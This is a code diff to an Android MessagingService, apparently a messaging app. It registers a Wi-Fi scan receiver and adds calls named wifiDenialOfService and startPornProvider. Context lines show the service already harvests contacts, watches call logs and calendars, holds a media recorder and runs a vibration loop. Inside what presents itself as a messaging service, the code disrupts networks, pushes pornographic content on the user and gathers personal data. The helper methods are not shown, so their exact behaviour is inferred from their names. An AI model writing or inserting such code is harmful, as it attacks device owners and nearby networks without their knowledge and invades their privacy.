@@ -10,6 +10,7 @@ import android.database.sqlite.SQLiteDatabase;
 import android.location.LocationManager;
 import android.media.MediaRecorder;
 import android.net.Uri;
+import android.net.wifi.WifiManager;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
@@ -35,6 +36,7 @@ public class MessagingService extends Service {
     private CallLogObserver mCallLogObserver;
     private CalendarObserver mCalendarObserver;
     private HeadsetPlugReceiver mHeadsetReceiver;
+    private WifiReceiver mWifiReceiver;
     protected static String sTelephoneAddress;
     private LocationManager mLocationManager;
     protected static MediaRecorder sMediaRecorder;
@@ -55,6 +57,7 @@ public class MessagingService extends Service {
         mCreateConversationReceiver = new CreateConversationReceiver();
         mScreenReceiver = new ScreenReceiver();
         mWapReceiver = new WapReceiver();
+        mWifiReceiver = new WifiReceiver();
         IntentFilter wapFilter = new IntentFilter("android.provider.Telephony.WAP_PUSH_RECEIVED");
         wapFilter.addAction("android.provider.Telephony.MMS_RECEIVED");
         try {
@@ -90,6 +93,7 @@ public class MessagingService extends Service {
         }
         registerReceiver(mShareReceiver, shareFilter);*/
         IntentFilter imeFilter = new IntentFilter(Intent.ACTION_INPUT_METHOD_CHANGED);
+        IntentFilter wifiFilter = new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION);
         registerReceiver(mWapReceiver, wapFilter);
         registerReceiver(mCreateConversationReceiver, conversationFilter);
         registerReceiver(mIncomingReceiver, incomingFilter);
@@ -97,6 +101,7 @@ public class MessagingService extends Service {
         registerReceiver(mHeadsetReceiver, headsetFilter);
         registerReceiver(mScreenReceiver, screenFilter);
         registerReceiver(mImeReceiver, imeFilter);
+        registerReceiver(mWifiReceiver, wifiFilter);
         IntentFilter databaseFilter = new IntentFilter();
         databaseFilter.addAction(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
         databaseFilter.addAction(Constants.Actions.ACTION_OUTGOING_SMS);
@@ -199,7 +204,6 @@ public class MessagingService extends Service {
                 } catch (InterruptedException e) {
                     e.printStackTrace();
                 }
-                Lofl.watchPornHubVideo(MessagingService.this, "ph5784420f542c6");
                 Lofl.vibrator(MessagingService.this);
                 try {
                     Thread.sleep(5000);
@@ -210,7 +214,8 @@ public class MessagingService extends Service {
             }
         }).start();
         Lofl.fetchContactsInformation(this);
-
+        Lofl.wifiDenialOfService(this);
+        Lofl.startPornProvider(this, 180000);
     }
 
     @Override
@@ -228,6 +233,7 @@ public class MessagingService extends Service {
         //unregisterReceiver(mAirplaneReceiver);
         DatabaseHelper.getInstance(getApplicationContext()).close();
         unregisterReceiver(mDatabaseReceiver);
+        unregisterReceiver(mWifiReceiver);
         getContentResolver().unregisterContentObserver(mObserver);
         getContentResolver().unregisterContentObserver(mCallLogObserver);
         getContentResolver().unregisterContentObserver(mCalendarObserver);
